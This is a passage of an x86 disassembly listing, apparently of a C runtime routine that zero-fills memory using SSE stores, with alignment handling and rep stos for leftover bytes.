  40db5b:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  40db60:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  40db65:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  40db6a:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  40db6f:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  40db74:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  40db79:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40db7f:	49                   	dec    %ecx
  40db80:	75 d0                	jne    0x40db52
  40db82:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40db85:	8b e5                	mov    %ebp,%esp
  40db87:	5d                   	pop    %ebp
  40db88:	c3                   	ret
  40db89:	55                   	push   %ebp
  40db8a:	8b ec                	mov    %esp,%ebp
  40db8c:	83 ec 10             	sub    $0x10,%esp
  40db8f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40db92:	8b 45 08             	mov    0x8(%ebp),%eax
  40db95:	99                   	cltd
  40db96:	8b f8                	mov    %eax,%edi
  40db98:	33 fa                	xor    %edx,%edi
  40db9a:	2b fa                	sub    %edx,%edi
  40db9c:	83 e7 0f             	and    $0xf,%edi
  40db9f:	33 fa                	xor    %edx,%edi
  40dba1:	2b fa                	sub    %edx,%edi
  40dba3:	85 ff                	test   %edi,%edi
  40dba5:	75 3c                	jne    0x40dbe3
  40dba7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40dbaa:	8b d1                	mov    %ecx,%edx
  40dbac:	83 e2 7f             	and    $0x7f,%edx
  40dbaf:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40dbb2:	3b ca                	cmp    %edx,%ecx
  40dbb4:	74 12                	je     0x40dbc8
  40dbb6:	2b ca                	sub    %edx,%ecx
  40dbb8:	51                   	push   %ecx
  40dbb9:	50                   	push   %eax
  40dbba:	e8 73 ff ff ff       	call   0x40db32
  40dbbf:	83 c4 08             	add    $0x8,%esp
  40dbc2:	8b 45 08             	mov    0x8(%ebp),%eax
  40dbc5:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40dbc8:	85 d2                	test   %edx,%edx
  40dbca:	74 45                	je     0x40dc11
  40dbcc:	03 45 10             	add    0x10(%ebp),%eax
  40dbcf:	2b c2                	sub    %edx,%eax
  40dbd1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40dbd4:	33 c0                	xor    %eax,%eax
  40dbd6:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40dbd9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40dbdc:	f3 aa                	rep stos %al,%es:(%edi)
  40dbde:	8b 45 08             	mov    0x8(%ebp),%eax
  40dbe1:	eb 2e                	jmp    0x40dc11
  40dbe3:	f7 df                	neg    %edi
  40dbe5:	83 c7 10             	add    $0x10,%edi
  40dbe8:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40dbeb:	33 c0                	xor    %eax,%eax
  40dbed:	8b 7d 08             	mov    0x8(%ebp),%edi
  40dbf0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40dbf3:	f3 aa                	rep stos %al,%es:(%edi)
  40dbf5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40dbf8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dbfb:	8b 55 10             	mov    0x10(%ebp),%edx
  40dbfe:	03 c8                	add    %eax,%ecx
  40dc00:	2b d0                	sub    %eax,%edx
  40dc02:	52                   	push   %edx
  40dc03:	6a 00                	push   $0x0
  40dc05:	51                   	push   %ecx
  40dc06:	e8 7e ff ff ff       	call   0x40db89
  40dc0b:	83 c4 0c             	add    $0xc,%esp
  40dc0e:	8b 45 08             	mov    0x8(%ebp),%eax
  40dc11:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40dc14:	8b e5                	mov    %ebp,%esp
  40dc16:	5d                   	pop    %ebp
  40dc17:	c3                   	ret
